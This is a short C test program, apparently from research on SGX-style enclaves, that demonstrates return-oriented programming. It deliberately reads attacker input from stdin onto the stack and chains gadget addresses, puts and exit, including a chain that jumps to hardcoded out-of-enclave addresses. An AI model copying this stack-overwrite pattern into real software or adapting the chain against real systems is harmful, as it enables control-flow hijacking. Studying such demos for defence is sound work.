/* a very simple test program */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <enclave.h>

extern void gadget1();
extern void gadget2();
extern void gadget3();
extern void gadget4();
extern void exit();

#define SET_PL(idx, pl) *(unsigned long *)((unsigned long)&stack + \
        (idx) * sizeof(unsigned long)) = (unsigned long)(pl)

const static char *msg = "ROP success";
void test_rop()
{
    unsigned long stack;
    SET_PL(2, gadget4);
    SET_PL(3, msg);
    SET_PL(4, puts);
    SET_PL(5, exit);
    SET_PL(6, 0x400fbc);            // actually not needed
    SET_PL(7, gadget3);             // actually not needed
}

void test_rop_eexit()
{
    unsigned long stack;
    SET_PL(2, gadget1);
    SET_PL(3, 0xFFFFFFFFFFFFFFFF);
    SET_PL(4, gadget2);
    SET_PL(5, 0x604288);            // address of "attack_msg" (out enclave)
    SET_PL(6, 0x400fbc);            // address of "attacked" (out enclave)
    SET_PL(7, gadget3);
}

void rop()
{
    unsigned long stack;
    read(0, (void *)((unsigned long)&stack + 2 * sizeof(unsigned long)),
            6 * sizeof(unsigned long));
}

void enclave_main()
{
    push_gadget((unsigned long)gadget4);
    push_gadget((unsigned long)msg);
    push_gadget((unsigned long)puts);
    push_gadget((unsigned long)exit);
    push_gadget((unsigned long)gadget1);
    push_gadget((unsigned long)gadget2);
    push_gadget((unsigned long)gadget3);
    rop();
    puts("not reached");
    enclave_exit();
}
